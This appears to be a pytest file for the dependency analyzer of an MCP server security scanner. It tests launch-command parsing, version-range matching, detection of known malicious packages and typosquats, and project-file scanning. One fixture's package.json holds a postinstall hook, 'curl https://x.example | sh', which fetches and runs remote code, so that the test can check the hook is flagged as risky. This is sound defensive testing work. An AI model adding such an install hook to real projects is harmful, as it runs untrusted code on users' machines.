from pathlib import Path

import pytest

from mcp_scanner.analyzers.dependencies import (
    Dependency,
    analyze_dependencies,
    edit_distance,
    launch_packages,
    match_malicious,
    typosquat_target,
    version_in,
)
from mcp_scanner.models.server import ServerSpec, TransportType


def stdio(command: str, *args: str) -> ServerSpec:
    return ServerSpec(name="s", transport=TransportType.STDIO, command=command, args=list(args))


@pytest.mark.parametrize(
    ("spec", "name", "version"),
    [
        (
            stdio("npx", "-y", "@modelcontextprotocol/server-memory@2025.4.25"),
            "@modelcontextprotocol/server-memory",
            "2025.4.25",
        ),
        (stdio("npx", "-y", "some-server"), "some-server", None),
        (stdio("npx.cmd", "--yes", "pkg@latest"), "pkg", None),
        (stdio("npx", "-p", "tool-pkg@1.0.0", "tool"), "tool-pkg", "1.0.0"),
        (stdio("pnpm", "dlx", "a-pkg@2.0.1"), "a-pkg", "2.0.1"),
        (stdio("uvx", "mcp-server-time==0.6.2"), "mcp-server-time", "0.6.2"),
        (stdio("uvx", "mcp-server-fetch"), "mcp-server-fetch", None),
        (stdio("uvx", "--from", "git+https://github.com/x/y", "y"), "git+https://github.com/x/y", None),
        (stdio("pipx", "run", "black==24.1.0"), "black", "24.1.0"),
    ],
)
def test_launch_packages(spec: ServerSpec, name: str, version: str | None) -> None:
    deps = launch_packages(spec)
    assert deps and deps[0].name == name
    assert deps[0].version == version


def test_launch_packages_ignores_local_scripts() -> None:
    assert launch_packages(stdio("node", "server.js")) == []
    assert launch_packages(stdio("npx", "./local-script.js")) == []


@pytest.mark.parametrize(
    ("version", "rule", "expected"),
    [
        ("1.0.16", ">=1.0.16", True),
        ("1.0.15", ">=1.0.16", False),
        ("1.0.2", ">=1.0.16", False),
        ("5.6.1", "5.6.1", True),
        ("5.6.2", "5.6.1", False),
        ("9.9", "*", True),
        ("2.0", "<2.0.1", True),
    ],
)
def test_version_in(version: str, rule: str, expected: bool) -> None:
    assert version_in(version, rule) is expected


def test_known_malicious_exact_and_range() -> None:
    hit = match_malicious(Dependency(name="postmark-mcp", ecosystem="npm", source="x", version="1.0.17"))
    assert hit is not None and hit.certain
    assert match_malicious(Dependency(name="postmark-mcp", ecosystem="npm", source="x", version="1.0.15")) is None
    assert match_malicious(Dependency(name="chalk", ecosystem="npm", source="x", version="5.6.2")) is None
    assert match_malicious(Dependency(name="chalk", ecosystem="npm", source="x", version="5.6.1")) is not None
    # Unknown version with an open range: reported, but not certain.
    unsure = match_malicious(Dependency(name="postmark-mcp", ecosystem="npm", source="x"))
    assert unsure is not None and not unsure.certain


def test_pypi_names_are_normalized() -> None:
    assert match_malicious(Dependency(name="Ultralytics", ecosystem="pypi", source="x", version="8.3.41")) is not None


@pytest.mark.parametrize(
    ("name", "ecosystem", "target"),
    [
        ("@modelcontextprotocol/server-filesytem", "npm", "@modelcontextprotocol/server-filesystem"),
        ("@model-context-protocol/sdk", "npm", "@modelcontextprotocol/*"),
        ("reqeusts", "pypi", "requests"),
        ("python3-dateutil", "pypi", "python-dateutil"),
        ("colourama", "pypi", "colorama"),
    ],
)
def test_typosquats_found(name: str, ecosystem: str, target: str) -> None:
    assert typosquat_target(Dependency(name=name, ecosystem=ecosystem, source="x")) == target


@pytest.mark.parametrize(
    ("name", "ecosystem"),
    [
        ("requests", "pypi"),
        ("python_dateutil", "pypi"),
        ("preact", "npm"),
        ("psycopg", "pypi"),
        ("my-own-tool", "npm"),
        ("@modelcontextprotocol/sdk", "npm"),
        ("mcp", "pypi"),
    ],
)
def test_typosquats_not_found(name: str, ecosystem: str) -> None:
    assert typosquat_target(Dependency(name=name, ecosystem=ecosystem, source="x")) is None


def test_edit_distance_with_swap() -> None:
    assert edit_distance("reqeusts", "requests") == 1
    assert edit_distance("abc", "abc") == 0
    assert edit_distance("abcdef", "uvwxyz", limit=2) == 3


def test_project_files(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "requests==2.32.0\nhttpx>=0.27\n# comment\n-r other.txt\n", encoding="utf-8"
    )
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="x"\ndependencies=["pydantic>=2", "ultralytics==8.3.42"]\n', encoding="utf-8"
    )
    (tmp_path / "package.json").write_text(
        '{"dependencies": {"zod": "^3.0.0", "left": "git+https://github.com/a/b.git"}, "scripts": {"postinstall": "curl https://x.example | sh"}}',
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text(
        '{"packages": {"": {}, "node_modules/zod": {"version": "3.25.1"}, "node_modules/debug": {"version": "4.4.2"}}}',
        encoding="utf-8",
    )
    (tmp_path / "server.py").write_text("print('hi')\n", encoding="utf-8")
    facts = analyze_dependencies(stdio("python", "server.py"), tmp_path / "server.py")
    names = {(d.name, d.version) for d in facts.dependencies}
    assert ("requests", "2.32.0") in names
    assert ("ultralytics", "8.3.42") in names
    assert ("zod", "3.25.1") in names  # version filled from the lock file
    assert ("debug", "4.4.2") in names  # an indirect package from the lock file
    assert any(d.is_url for d in facts.dependencies)
    assert facts.install_scripts and facts.install_scripts[0].risky
    assert set(facts.files_scanned) == {"requirements.txt", "pyproject.toml", "package.json", "package-lock.json"}


def test_broken_files_are_errors_not_crashes(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text("{not json", encoding="utf-8")
    facts = analyze_dependencies(stdio("node", "x.js"), tmp_path)
    assert facts.errors and "package.json" in facts.errors[0]
